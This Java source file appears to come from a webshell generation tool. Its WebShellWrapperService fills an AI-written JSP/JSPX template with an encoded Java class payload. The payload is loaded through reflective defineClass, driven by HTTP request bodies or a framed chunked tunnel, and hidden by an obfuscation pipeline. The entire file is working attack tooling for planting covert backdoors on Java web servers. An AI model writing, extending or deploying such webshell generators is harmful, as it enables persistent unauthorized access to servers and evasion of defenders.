package org.leo.jmg.generation;

import org.leo.jmg.TransportProtocol;
import org.leo.jmg.mem.packer.jsp.JspObfuscationPipeline;
import org.leo.jmg.mem.packer.jsp.JspObfuscationPlanContext;
import org.leo.jmg.mem.packer.jsp.JspObfuscationPlanner;

import java.io.ByteArrayOutputStream;
import java.math.BigInteger;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPOutputStream;

/** 验证 AI Wrapper 模板、注入 Core，并执行平台侧确定性混淆。 */
public final class WebShellWrapperService {

    public WebShellWrapperContract getContract(String artifactType, String protocol) {
        return WebShellWrapperContract.create(artifactType, protocol);
    }

    public WebShellWrapperResult assemble(CoreArtifact artifact,
                                          String template,
                                          String artifactType,
                                          Integer responseCode,
                                          List<String> obfuscationSteps) throws Exception {
        if (artifact == null) throw new IllegalArgumentException("CoreArtifact 不能为空");
        WebShellWrapperContract contract = WebShellWrapperContract.create(
                artifactType, artifact.getProtocol().getValue());
        contract.validate(template);
        int status = responseCode == null ? 200 : responseCode.intValue();
        validateResponseCode(status, artifact.getProtocol());

        String content = render(artifact, template, status);
        content = obfuscate(contract, artifact, content, obfuscationSteps);

        Map<String, Object> metadata = new LinkedHashMap<String, Object>();
        metadata.put("type", contract.getArtifactType());
        metadata.put("protocol", artifact.getProtocol().getValue());
        metadata.put("coreClassName", artifact.getCoreClassName());
        metadata.put("coreSha256", artifact.getSha256());
        metadata.put("targetJavaVersion", artifact.getTargetJavaVersion().getValue());
        metadata.put("servletNamespace", artifact.getServletNamespace().getValue());
        metadata.put("obfuscationSeed", Long.toString(artifact.getObfuscationSeed()));
        metadata.put("wrapperMode", "ai-template-contract-v1");
        metadata.put("lines", content.split("\\n").length);
        metadata.put("chars", content.length());
        return new WebShellWrapperResult(content, metadata);
    }

    private String render(CoreArtifact artifact,
                          String template,
                          int responseCode) throws Exception {
        String payload = gzipBase36(artifact.getBytecode());
        String className = artifact.getCoreClassName();
        String result = template;
        result = result.replace(WebShellWrapperContract.DECLARE_STATE,
                declareState(responseCode));
        result = result.replace(WebShellWrapperContract.LOAD_CORE,
                loadCore(className, payload));
        if (artifact.getProtocol() == TransportProtocol.HTTP_CHUNK) {
            result = result.replace(WebShellWrapperContract.READ_REQUEST, readChunkRequest(responseCode));
            result = result.replace(WebShellWrapperContract.INVOKE_CORE, invokeCore(className));
            result = result.replace(WebShellWrapperContract.WRITE_RESPONSE, writeChunkResponse());
        } else {
            result = result.replace(WebShellWrapperContract.READ_REQUEST, readHttpRequest());
            result = result.replace(WebShellWrapperContract.INVOKE_CORE, invokeCore(className));
            result = result.replace(WebShellWrapperContract.WRITE_RESPONSE, writeHttpResponse());
        }
        return result;
    }

    private String obfuscate(WebShellWrapperContract contract,
                             CoreArtifact artifact,
                             String content,
                             List<String> steps) {
        boolean jsp = "JSP".equals(contract.getArtifactType());
        JspObfuscationPipeline pipeline;
        if (steps == null) {
            pipeline = jsp
                    ? JspObfuscationPipeline.jspDefault(artifact.getObfuscationSeed())
                    : JspObfuscationPipeline.jspxDefault(artifact.getObfuscationSeed());
        } else {
            JspObfuscationPlanContext.Format format = jsp
                    ? JspObfuscationPlanContext.Format.JSP
                    : JspObfuscationPlanContext.Format.JSPX;
            pipeline = JspObfuscationPlanner.compile(
                    steps,
                    JspObfuscationPlanContext.webShell(
                            format, artifact.getObfuscationSeed())).getPipeline();
        }
        return pipeline.apply(content);
    }

    private static String declareState(int responseCode) {
        return "response.setStatus(" + responseCode + ");\n"
                + "out.clear();\n"
                + "java.io.ByteArrayOutputStream leoBuffer = new java.io.ByteArrayOutputStream();\n"
                + "byte[] leoChunk = new byte[1024];\n"
                + "int leoRead;";
    }

    private static String loadCore(String className, String payload) {
        return "try {\n"
                + "    Class.forName(\"" + className + "\");\n"
                + "} catch (ClassNotFoundException leoMissing) {\n"
                + "    String leoEncoded = \"" + payload + "\";\n"
                + "    byte[] leoCompressed = new java.math.BigInteger(leoEncoded, 36).toByteArray();\n"
                + "    if (leoCompressed.length > 0 && leoCompressed[0] == 0) {\n"
                + "        byte[] leoTrimmed = new byte[leoCompressed.length - 1];\n"
                + "        System.arraycopy(leoCompressed, 1, leoTrimmed, 0, leoTrimmed.length);\n"
                + "        leoCompressed = leoTrimmed;\n"
                + "    }\n"
                + "    java.util.zip.GZIPInputStream leoGzip = new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(leoCompressed));\n"
                + "    while ((leoRead = leoGzip.read(leoChunk)) != -1) leoBuffer.write(leoChunk, 0, leoRead);\n"
                + "    java.lang.reflect.Method leoDefine = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class);\n"
                + "    leoDefine.setAccessible(true);\n"
                + "    leoDefine.invoke(ClassLoader.getSystemClassLoader(), null, leoBuffer.toByteArray(), 0, leoBuffer.size());\n"
                + "}";
    }

    private static String readHttpRequest() {
        return "java.io.InputStream leoInput = request.getInputStream();\n"
                + "leoBuffer.reset();\n"
                + "while ((leoRead = leoInput.read(leoChunk)) != -1) leoBuffer.write(leoChunk, 0, leoRead);";
    }

    private static String invokeCore(String className) {
        return "try { ((java.lang.reflect.InvocationHandler) Class.forName(\"" + className
                + "\").newInstance()).invoke(null, null, new Object[]{leoBuffer}); } catch (Throwable e) { throw new IllegalStateException(\"Core invocation failed\", e); }";
    }

    private static String writeHttpResponse() {
        return "response.getOutputStream().write(leoBuffer.toByteArray());";
    }

    private static String readChunkRequest(int responseCode) {
        return "java.io.DataInputStream leoIn = new java.io.DataInputStream(request.getInputStream());\n"
                + "response.setStatus(" + responseCode + ");\n"
                + "response.setHeader(\"X-Accel-Buffering\", \"no\");\n"
                + "response.setHeader(\"Connection\", \"keep-alive\");\n"
                + "response.setContentType(\"application/octet-stream\");\n"
                + "java.io.DataOutputStream leoOut = new java.io.DataOutputStream(response.getOutputStream());\n"
                + "leoOut.flush();\n"
                + "while (true) {\n"
                + "    int leoFrameType = leoIn.readUnsignedByte();\n"
                + "    long leoTransportId = leoIn.readLong();\n"
                + "    int leoLength = leoIn.readInt();\n"
                + "    if (leoLength < 0 || leoLength > 16777216) break;\n"
                + "    byte[] leoData = new byte[leoLength];\n"
                + "    leoIn.readFully(leoData);\n"
                + "    if (leoFrameType == 4) break;\n"
                + "    if (leoFrameType == 3) continue;\n"
                + "    int leoResponseType;\n"
                + "    byte[] leoResponseData;\n"
                + "    if (leoFrameType == 2 && leoLength == 0) {\n"
                + "        leoResponseType = 3;\n"
                + "        leoResponseData = new byte[0];\n"
                + "    } else if (leoFrameType == 1) {\n"
                + "        leoResponseType = 1;\n"
                + "        leoBuffer = new java.io.ByteArrayOutputStream();\n"
                + "        leoBuffer.write(leoData);";
    }

    private static String writeChunkResponse() {
        return "        leoResponseData = leoBuffer.toByteArray();\n"
                + "    } else {\n"
                + "        break;\n"
                + "    }\n"
                + "    if (leoResponseData.length > 16777216) break;\n"
                + "    leoOut.writeByte(leoResponseType);\n"
                + "    leoOut.writeLong(leoTransportId);\n"
                + "    leoOut.writeInt(leoResponseData.length);\n"
                + "    leoOut.write(leoResponseData);\n"
                + "    leoOut.flush();\n"
                + "}";
    }

    private static void validateResponseCode(int responseCode, TransportProtocol protocol) {
        if (responseCode < 100 || responseCode > 599) {
            throw new IllegalArgumentException("respCode 必须在 100 到 599 之间");
        }
        if (protocol == TransportProtocol.HTTP_CHUNK
                && (responseCode < 200 || responseCode == 204
                || responseCode == 205 || responseCode == 304)) {
            throw new IllegalArgumentException("httpchunk 响应状态必须允许持续响应体: " + responseCode);
        }
    }

    private static String gzipBase36(byte[] bytecode) throws Exception {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        GZIPOutputStream gzip = new GZIPOutputStream(output);
        try {
            gzip.write(bytecode);
            gzip.finish();
        } finally {
            gzip.close();
        }
        return new BigInteger(1, output.toByteArray()).toString(36);
    }
}
